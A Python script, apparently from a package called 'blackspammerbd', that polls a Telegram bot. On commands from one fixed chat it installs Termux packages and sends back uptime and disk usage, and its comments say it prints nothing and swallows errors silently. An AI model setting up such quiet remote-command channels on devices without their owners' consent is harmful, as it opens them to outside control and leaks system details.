import time
import subprocess
import requests
from blackspammerbd.config import bot_token, chat_id

BASE_URL = f"https://api.telegram.org/bot{bot_token}"
_last_update_id = 0

def _send_message(text: str):
    """
    Telegram Bot-এ text পাঠাবে।
    কোনো প্রিন্ট নেই—Exception হলেও সাইলেন্টলি পাস।
    """
    try:
        url = f"{BASE_URL}/sendMessage"
        data = {"chat_id": chat_id, "text": text}
        requests.post(url, data=data, timeout=15)
    except Exception:
        pass

def _handle_install(args: list):
    """
    /install <package_name> কমান্ড হ্যান্ডেল করবে।
    Termux এ pkg install -y <package_name> চালাবে,
    এবং আউটপুট Office-এ পাঠাবে।
    """
    if not args:
        _send_message("Usage: /install <package_name>")
        return

    pkg_name = args[0]
    _send_message(f"Installing `{pkg_name}` ...")
    try:
        proc = subprocess.run(
            ["pkg", "install", "-y", pkg_name],
            capture_output=True,
            text=True,
            timeout=300
        )
        output = proc.stdout + proc.stderr
        _send_message(f"Installation of `{pkg_name}` complete.\n```\n{output}\n```")
    except Exception as e:
        _send_message(f"Error installing `{pkg_name}`: {e}")

def _handle_status():
    """
    /status কমান্ড হ্যান্ডেল করবে (uptime ও disk usage)।
    """
    try:
        uptime = subprocess.check_output(["uptime"], text=True).strip()
        df = subprocess.check_output(["df", "-h"], text=True).strip()
        msg = f"📊 *STATUS REPORT*\n\n*Uptime:* `{uptime}`\n\n*Disk Usage:*\n```\n{df}\n```"
        _send_message(msg)
    except Exception:
        pass

def _handle_unknown(cmd: str):
    """
    অন্য কোনো কমান্ড এলে Unknown বলে জানাবে।
    """
    _send_message(f"Unknown command: `{cmd}`\nUse /install or /status")

def _process_update(message: dict):
    """
    একট Update-এর Message থেকে text নিয়ে,
    কমান্ড ও আর্গুমেন্ট বের করে হ্যান্ডেল করবে।
    """
    text = message.get("text", "").strip()
    if not text:
        return

    parts = text.split()
    command = parts[0].lower()
    args = parts[1:]

    if command == "/install":
        _handle_install(args)
    elif command == "/status":
        _handle_status()
    else:
        _handle_unknown(command)

def poll_updates():
    """
    Telegram getUpdates API পোল করে,
    নতুন মেসেজ এলে _process_update() কল করবে।
    """
    global _last_update_id
    while True:
        try:
            url = f"{BASE_URL}/getUpdates"
            params = {"timeout": 30, "offset": _last_update_id + 1}
            resp = requests.get(url, params=params, timeout=60)
            data = resp.json()

            if not data.get("ok"):
                time.sleep(5)
                continue

            for result in data.get("result", []):
                _last_update_id = result["update_id"]
                message = result.get("message")
                if not message:
                    continue
                chat = message.get("chat", {})
                from_id = chat.get("id")
                # শুধুমাত্র নির্দিষ্ট chat_id থেকে মেসেজ নেবে
                if str(from_id) != str(chat_id):
                    continue
                _process_update(message)
        except Exception:
            time.sleep(5)

if __name__ == "__main__":
    poll_updates()
